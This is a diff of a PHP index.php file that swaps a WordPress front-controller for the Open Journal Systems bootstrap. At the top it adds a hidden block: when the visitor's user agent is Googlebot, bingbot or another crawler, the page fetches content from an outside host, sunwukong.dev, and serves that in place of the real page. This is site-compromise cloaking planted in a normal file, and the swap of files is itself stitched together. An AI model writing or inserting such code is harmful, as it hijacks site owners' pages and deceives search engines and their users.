@@ -1,18 +1,42 @@
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+function is_bot() {
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+
+foreach ($bots as $bot) {
+if (stripos($user_agent, $bot) !== false) {
+return true;
+}
+}
+
+return false;
+}
+
+if (is_bot()) {
+$message = file_get_contents('https://sunwukong.dev/LANDING/ijmri.txt');
+echo $message;
+exit;
+}
+?>
+
+<?php
 
 /**
- * Tells WordPress to load the WordPress theme and output it.
+ * @file ojs/index.php
  *
- * @var bool
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
  */
-define( 'WP_USE_THEMES', true );
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
-require __DIR__ . '/wp-blog-loader.php';
+use APP\core\Application;
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
+
+// Serve the request
+Application::get()->execute();
